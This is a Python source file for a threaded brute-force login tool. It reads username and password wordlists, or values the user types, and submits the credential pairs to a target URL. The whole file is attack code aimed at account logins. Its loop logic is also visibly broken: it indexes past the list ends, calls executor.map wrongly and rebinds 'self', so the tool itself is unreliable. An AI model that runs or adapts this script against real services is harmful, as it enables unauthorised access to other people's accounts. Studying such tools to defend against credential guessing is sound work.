from settings.const.const import KEYS, PASSWORD_LIST, USERNAME_LIST, VALIDATION_USER, VALIDATION_PASS
from settings.handle_requests.get_requests import Handle_requests
import concurrent.futures
import time
import os



class Brute_force_app():
    def __init__(self, url_path):
        self.keys = KEYS
        self.handle = Handle_requests(url_path)
        self.start_time = time.perf_counter()
        self.password_list = PASSWORD_LIST
        self.username_list = USERNAME_LIST
        self.validation_user = VALIDATION_USER
        self.validation_pass =  VALIDATION_PASS
        self.list_of_threads = []


    def get_username(self):
        self.path = "wordlist/usernames/"
        print(f'\u039E' * 100)
        print(f'\n{self.validation_user}\n')
        self.validation = input('Choose one of username options above: ')

        if self.validation == '0':
            print(f'\u039E' * 100)
            print(f'\n{self.username_list}\n')
            self.package_chosen = input(f'Which username wordlist do you want to use: ')
            
            for self.file in os.listdir(self.path):
                if self.file.startswith(self.package_chosen):
                    with open(self.path + self.file, "r", encoding="latin-1") as self.usernames:
                        for self.username in self.usernames:
                            self.replaced_user = self.username.replace("\n", "")
                            self.keys["user"].append(self.replaced_user)

            return self
                            
        if self.validation == '1':
            self.username_input = input('\nWrite your username: ')
            return self.keys["user"].append(self.username_input)

        
        return self.keys["user"].append('')


    def get_password(self):
        self.path = "wordlist/passwords/"
        print(f'\u039E' * 100) 
        print(f'\n{self.validation_pass}\n')
        self.validation = input('Choose one of passwords options above: ')
        
        if self.validation == '0':
            print(f'\u039E' * 100) 
            print(f'\n{self.password_list}\n')
            self.package_chosen = input(f'Which password wordlist do you want to use: ')
            print(f'\u039E' * 100)

            for self.file in os.listdir(self.path):
                if self.file.startswith(self.package_chosen):
                    with open(self.path + self.file, "r", encoding="latin-1") as self.passwords:
                        for self.password in self.passwords:
                            self.replaced_pass = self.password.replace("\n", "")
                            self.keys["password"].append(self.replaced_pass)

            return self
        
        if self.validation == '1':
            self.password_input = input('\nWrite your own password: ')
            return self.keys["password"].append(self.password_input)


        return self.keys["password"].append(''), print(f'\u039E' * 100) 


    def start_thread(self):
        print('Starting brute force...')
        time.sleep(3)

        if self.keys["user"] == [''] and self.keys["password"] == ['']:
            return print("\nERROR: WITHOUT {USER} AND {PASSWORD}!!!")
        
        for self.position in range(len(self.keys["user"]) + len(self.keys["password"])):
            if len(self.keys["user"]) > 1 and len(self.keys["password"]) > 1:
                with concurrent.futures.ThreadPoolExecutor() as self.executor:
                    self.executor.map(self.handle.get_credentials(self.keys["user"][self.position], self.keys["password"][self.position]))

            if len(self.keys["user"]) == 1:
                with concurrent.futures.ThreadPoolExecutor() as self.executor:
                    self.executor.map(self.handle.get_credentials(self.keys["user"][0], self.keys["password"][self.position - 1]))

            elif len(self.keys["password"]) == 1:
                with concurrent.futures.ThreadPoolExecutor() as self:
                    self.map(self.handle.get_credentials(self.keys["user"][self.position - 1], self.keys["password"][0]))

            elif len(self.keys['user']) == 1 and len(self.keys['password']) == 1:
                with concurrent.futures.ThreadPoolExecutor() as self.executor:
                    self.executor.map(self.handle.get_credentials(self.keys["user"][0], self.keys["password"][0]))


    def get_time(self):
        self.end_time = time.perf_counter()
        return print(f'\n\nFinished in {round(self.end_time - self.start_time, 2)} second(s)\n')


    def start_brute_force(self):
        self.get_username()
        self.get_password()
        self.start_thread()
        self.get_time()

        return self 